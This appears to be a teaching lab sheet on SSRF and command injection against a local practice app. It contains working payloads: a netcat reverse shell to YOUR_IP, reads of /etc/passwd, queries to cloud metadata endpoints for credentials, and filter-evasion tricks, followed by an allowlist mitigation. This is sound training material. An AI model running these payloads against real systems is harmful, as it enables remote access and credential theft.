# Week 08: SSRF & Command Injection

## Learning Objectives
- Understand Server-Side Request Forgery (SSRF)
- Exploit command injection vulnerabilities
- Implement input validation and allowlist-based security

## Exercises

### Exercise 1: Command Injection via Admin Logs
The admin logs endpoint executes arbitrary commands:

```bash
# Login as admin (you'll need to forge a JWT from week 04)
ADMIN_TOKEN="YOUR_ADMIN_JWT"

# List files
curl -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/logs?cmd=ls%20-la"

# Read sensitive files
curl -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/logs?cmd=cat%20/etc/passwd"

# Check network connections
curl -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/logs?cmd=netstat%20-an"

# Create a reverse shell (if nc is available)
curl -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/logs?cmd=nc%20YOUR_IP%204444%20-e%20/bin/sh"
```

**Questions:**
- What commands can you execute on the server?
- What is the impact of this vulnerability?
- Why shouldn't system commands be exposed via API?

### Exercise 2: SSRF via Admin Impersonation
The admin impersonation endpoint doesn't validate internal/external access:

```bash
# Try accessing internal services
curl -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password"}'
```

**Questions:**
- Can you access internal Docker networks?
- What other containers are reachable?
- How would you use SSRF to scan internal services?

### Exercise 3: SSRF to Access Cloud Metadata
If running in a cloud environment, try:

```bash
# AWS metadata
curl "http://localhost:8080/admin/logs?cmd=curl%20http://169.254.169.254/latest/meta-data/"

# GCP metadata
curl "http://localhost:8080/admin/logs?cmd=curl%20http://metadata.google.internal/computeMetadata/v1/"
```

**Questions:**
- What metadata endpoints are accessible?
- What credentials or tokens might be exposed?

### Exercise 4: Filter Evasion
If filters are added, try bypassing them:

```bash
# Using wildcards
cat /etc/passwd -> cat /etc/pa??wd

# Using hex encoding
printf 'cat\x20/etc/passwd' | sh

# Using command substitution
cat $(echo /etc/passwd)

# Using newlines or special characters
cat /etc/passwd%0Als
```

### Exercise 5: Mitigation

**Input validation for command execution:**
```javascript
const ALLOWED_COMMANDS = ["ls -la /app/logs", "df -h", "uptime"];

router.get("/logs", authenticateToken, adminOnly, async (req, res) => {
  const cmd = req.query.cmd;
  if (!ALLOWED_COMMANDS.includes(cmd)) {
    return res.status(400).json({ error: "Command not allowed" });
  }
  // ...
});
```

**Better:** Don't execute system commands at all.

## Deliverable
- Execute at least 3 different system commands
- Demonstrate a reverse shell or data exfiltration
- Propose input validation and command allowlist
